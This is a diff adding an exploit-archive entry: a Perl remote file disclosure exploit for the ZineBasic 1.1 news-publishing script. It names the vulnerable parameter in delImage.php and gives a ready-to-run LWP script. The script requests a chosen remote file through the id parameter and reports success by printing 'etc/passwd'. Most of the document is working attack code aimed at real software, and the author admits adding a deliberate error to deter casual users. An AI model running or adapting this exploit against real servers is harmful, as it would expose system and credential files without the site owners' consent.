@@ -1,0 +1,42 @@
+# Title: ZineBasic 1.1 Remote File Disclosure Exploit
+# Author: bd0rk || East Germany former GDR
+# Tested on: Ubuntu-Linux
+# Vendor: http://w2scripts.com/news-publishing/
+# Download: http://downloads.sourceforge.net/project/zinebasic/zinebasic/v1.1/zinebasic_v1.1_00182.zip?r=https%3A%2F%2Fsourceforge.net%2Fprojects%2Fzinebasic%2F&ts=1474313108&use_mirror=master
+# Twitter: twitter.com/bd0rk
+
+#Greetings: zone-h.org, Curesec GmbH, SiteL GmbH, i:TECS GmbH, rgod, GoLd_M
+----------------------------------------------------------------------------------
+=> Vulnerable sourcecode in /zinebasic_v1.1_00182/articleImg/delImage.php line 12
+
+=> Vulnerable snippet: $id = $_GET['id'];
+
+----------------------------------------------------------------------------------
+
+Exploitcode with little error inline 25-->'Gainst script-kiddies! || Copy&Paste:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#!/usr/bin/perl
+use LWP::Simple;
+use LWP::UserAgent;
+sub ex()
+{
+print "Usage: perl $0 someone.com /ZineBasic_Dir/\n";
+print "\nZineBasic 1.1 Remote File Disclosure Exploit\n";
+print "\ Contact: twitter.com/bd0rk\n";
+($host, $path, $under, $file,) = @ARGV;
+$under="/articleImg/";
+$file="delImage.php?id=[REMOTE_FILE]";
+my $target = "http://".$host.$path.$under.$file;
+my $usrAgent = LWP::UserAgent->new();
+my $request = $usrAgent->get($target,":content_file"=>"[REMOTE_FILE]");
+if ($request->is_success)
+{
+print "$target <= JACKPOT!\n\n";
+print "etc/passwd\n";
+exit();
+}
+else
+{
+print "Exploit $target FAILED!\n[!].$request->status_line.\n";
+exit();
+}
